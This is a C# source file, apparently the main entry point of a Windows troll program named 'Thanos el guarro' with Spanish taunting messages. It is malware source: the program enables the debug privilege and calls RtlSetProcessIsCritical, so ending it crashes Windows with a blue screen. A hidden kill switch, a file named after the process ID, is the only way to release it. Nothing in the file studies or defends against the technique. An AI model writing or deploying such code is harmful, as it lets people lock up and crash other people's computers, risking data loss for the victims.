using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Thanos_el_guarro
{
    internal static class Program
    {
        [DllImport("winmm.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)] public static extern uint waveOutGetNumDevs();
        [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)] private static extern bool SetProcessDPIAware();
        [DllImport("gdi32.dll")] private static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
        [DllImport("user32.dll")] private static extern IntPtr GetDC(IntPtr hWnd);
        public static double GetDPI() => (GetDeviceCaps(GetDC(IntPtr.Zero), 88) + 6) / 100;

        private static Process CurrentProcess = Process.GetCurrentProcess();

        [STAThread]
        private static void Main()
        {
            if (typeof(Program).Name != "Program")
            {
                MessageBox.Show("Error el programa fue modificado y es posible que no funcióne asi que me voy a ir", Application.ProductName, MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }

            if (waveOutGetNumDevs() == 0)
            {
                MessageBox.Show("Error necesitas un dispositivo de audio amorcito.\n\nSi no como vas a escuchar lo que te voy a decir?", Application.ProductName, MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }

            if (Environment.OSVersion.Version.Major < 6)
            {
                MessageBox.Show("El sistema operativo es demasiado antiguo", Application.ProductName, MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }

            SetProcessDPIAware();

            Protect();

            FileSystemWatcher watcher = new FileSystemWatcher() { Path = new FileInfo(Assembly.GetExecutingAssembly().FullName).Directory.FullName, Filter = "*.dll" };

            watcher.EnableRaisingEvents = true;
            watcher.Created += (object sender, FileSystemEventArgs e) =>
            {
                string TargetFile = CurrentProcess.Id + ".dll";

                if (e.Name == TargetFile)
                {
                    File.Delete(TargetFile);

                    Unprotect();

                    Environment.Exit(1);
                }
            };

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new ThanosTwerk());
        }

        [DllImport("ntdll.dll")] private static extern IntPtr RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool prevVal);

        [DllImport("ntdll.dll", SetLastError = true)] private static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);

        private static ReaderWriterLockSlim writerLock = new ReaderWriterLockSlim();

        private static volatile bool locked = false;

        public static void Protect()
        {
            RtlAdjustPrivilege(19, true, false, out bool prevVal);

            try
            {
                writerLock.EnterWriteLock();

                if (!locked)
                {
                    Process.EnterDebugMode();
                    RtlSetProcessIsCritical(1, 0, 0);
                    locked = true;
                }
            }
            finally
            {
                writerLock.ExitWriteLock();
            }
        }

        public static void Unprotect()
        {
            RtlAdjustPrivilege(19, true, false, out bool prevVal);

            try
            {
                writerLock.EnterWriteLock();

                if (locked)
                {
                    RtlSetProcessIsCritical(0, 0, 0);
                    locked = false;
                }
            }
            finally
            {
                writerLock.ExitWriteLock();
            }
        }
    }
}